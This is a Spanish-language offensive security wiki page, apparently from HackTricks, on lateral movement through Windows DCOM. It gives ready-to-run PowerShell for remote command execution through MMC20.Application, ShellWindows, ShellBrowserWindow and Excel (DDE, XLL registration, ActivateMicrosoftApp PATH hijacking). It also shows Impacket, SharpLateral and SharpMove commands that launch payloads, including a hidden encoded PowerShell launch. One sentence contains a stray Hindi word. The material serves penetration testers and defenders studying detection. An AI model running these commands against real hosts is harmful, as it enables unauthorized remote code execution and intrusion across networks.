# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

El movimiento lateral por DCOM es atractivo porque reutiliza servidores COM existentes expuestos a través de RPC/DCOM en lugar de crear un servicio o una tarea programada. En la práctica, esto significa que la conexión inicial normalmente comienza en TCP/135 y luego pasa a puertos RPC altos asignados dinámicamente.

## Prerequisites & Gotchas

- Normalmente necesitas un contexto de administrador local en el objetivo y el servidor COM remoto debe अनुमति remote launch/activation.
- Since **March 14, 2023**, Microsoft aplica el hardening de DCOM para sistemas compatibles. Los clientes antiguos que solicitan un nivel bajo de autenticación de activación pueden fallar a menos que negocien al menos `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY`. Los clientes modernos de Windows suelen elevarse automáticamente, así que la herramienta actual normalmente sigue funcionando.
- La ejecución manual o mediante script de DCOM generalmente necesita TCP/135 más el rango de puertos RPC dinámicos del objetivo. Si usas `dcomexec.py` de Impacket y quieres que el resultado del comando vuelva, normalmente también necesitas acceso SMB a `ADMIN$` (u otro recurso compartido con permiso de lectura/escritura).
- Si RPC/DCOM funciona pero SMB está bloqueado, `dcomexec.py -nooutput` aún puede ser útil para ejecución ciega.

Quick checks:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

**Para más información sobre esta técnica, consulta el post original en [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)**

Distributed Component Object Model (DCOM) objects presentan una capacidad interesante para interacciones basadas en red con objetos. Microsoft proporciona documentación completa tanto para DCOM como para Component Object Model (COM), accesible [here for DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) y [here for COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>). Una lista de aplicaciones DCOM puede obtenerse usando el comando de PowerShell:
```bash
Get-CimInstance Win32_DCOMApplication
```
El objeto COM, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), permite automatizar operaciones de los complementos de MMC. Cabe destacar que este objeto contiene un método `ExecuteShellCommand` bajo `Document.ActiveView`. Puedes encontrar más información sobre este método [aquí](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>). Compruébalo en ejecución:

Esta funcionalidad facilita la ejecución de comandos a través de la red mediante una aplicación DCOM. Para interactuar remotamente con DCOM como administrador, se puede utilizar PowerShell de la siguiente manera:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
Este comando se conecta a la aplicación DCOM y devuelve una instancia del objeto COM. Luego se puede invocar el método ExecuteShellCommand para ejecutar un proceso en el host remoto. El proceso implica los siguientes pasos:

Check methods:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
Obtén RCE:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
El último argumento es el estilo de ventana. `7` mantiene la ventana minimizada. Operativamente, la ejecución basada en MMC comúnmente lleva a que un proceso remoto `mmc.exe` haga spawn de tu payload, lo que es diferente de los objetos respaldados por Explorer que se muestran abajo.

## ShellWindows & ShellBrowserWindow

**Para más información sobre esta técnica, consulta el post original [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**

Se identificó que el objeto **MMC20.Application** carece de "LaunchPermissions" explícitos, por lo que usa por defecto permisos que permiten acceso a Administrators. Para más detalles, se puede explorar un hilo [aquí](https://twitter.com/tiraniddo/status/817532039771525120), y se recomienda el uso de [@tiraniddo](https://twitter.com/tiraniddo)’s OleView .NET para filtrar objetos sin Launch Permission explícito.

Se destacaron dos objetos específicos, `ShellBrowserWindow` y `ShellWindows`, debido a su falta de Launch Permissions explícitos. La ausencia de una entrada de registro `LaunchPermission` bajo `HKCR:\AppID\{guid}` significa que no hay permisos explícitos.

En comparación con `MMC20.Application`, estos objetos suelen ser más silenciosos desde una perspectiva de OPSEC porque el comando normalmente termina como hijo de `explorer.exe` en el host remoto en lugar de `mmc.exe`.

### ShellWindows

Para `ShellWindows`, que carece de un ProgID, los métodos de .NET `Type.GetTypeFromCLSID` y `Activator.CreateInstance` facilitan la instanciación del objeto usando su AppID. Este proceso aprovecha OleView .NET para obtener el CLSID de `ShellWindows`. Una vez instanciado, es posible interactuar a través del método `WindowsShell.Item`, lo que lleva a la invocación de métodos como `Document.Application.ShellExecute`.

Se proporcionaron ejemplos de comandos de PowerShell para instanciar el objeto y ejecutar comandos de forma remota:
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` es similar, pero puedes instanciarlo directamente a través de su CLSID y pivotar a `Document.Application.ShellExecute`:
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Movimiento lateral con Excel DCOM Objects

El movimiento lateral puede lograrse explotando DCOM Excel objects. Para información detallada, es recomendable leer la discusión sobre el uso de Excel DDE para movimiento lateral vía DCOM en [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom).

El proyecto Empire proporciona un script de PowerShell, que demuestra la utilización de Excel para remote code execution (RCE) manipulando DCOM objects. A continuación se muestran fragmentos del script disponible en el [repositorio GitHub de Empire](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), mostrando diferentes métodos para abusar de Excel para RCE:
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
Investigaciones recientes ampliaron esta área con el método `ActivateMicrosoftApp()` de `Excel.Application`. La idea clave es que Excel puede intentar lanzar aplicaciones antiguas de Microsoft como FoxPro, Schedule Plus o Project buscando en el `PATH` del sistema. Si un operador puede colocar un payload con uno de esos nombres esperados en una ubicación escribible que forme parte del `PATH` del objetivo, Excel lo ejecutará.

Requisitos para esta variación:

- Local admin en el target
- Excel instalado en el target
- Capacidad de escribir un payload en un directorio escribible en el `PATH` del target

Ejemplo práctico abusando de la búsqueda de FoxPro (`FOXPROW.exe`):
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
Si el host atacante no tiene registrado localmente el ProgID `Excel.Application`, instancia el objeto remoto por CLSID en su lugar:
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
Valores vistos abusados en la práctica:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### Herramientas de automatización para lateral movement

Se destacan dos herramientas para automatizar estas técnicas:

- **Invoke-DCOM.ps1**: Un script de PowerShell proporcionado por el proyecto Empire que simplifica la invocación de diferentes métodos para ejecutar código en máquinas remotas. Este script está disponible en el repositorio GitHub de Empire.

- **SharpLateral**: Una herramienta diseñada para ejecutar código de forma remota, que puede usarse con el comando:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- El script de Powershell [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) permite invocar fácilmente todas las formas comentadas de ejecutar código en otras máquinas.
- Puedes usar `dcomexec.py` de Impacket para ejecutar comandos en sistemas remotos usando DCOM. Las compilaciones actuales soportan `ShellWindows`, `ShellBrowserWindow` y `MMC20`, y por defecto usan `ShellWindows`.
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- También podrías usar [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- También podrías usar [**SharpMove**](https://github.com/0xthirteen/SharpMove)
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Referencias

- [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)

{{#include ../../banners/hacktricks-training.md}}
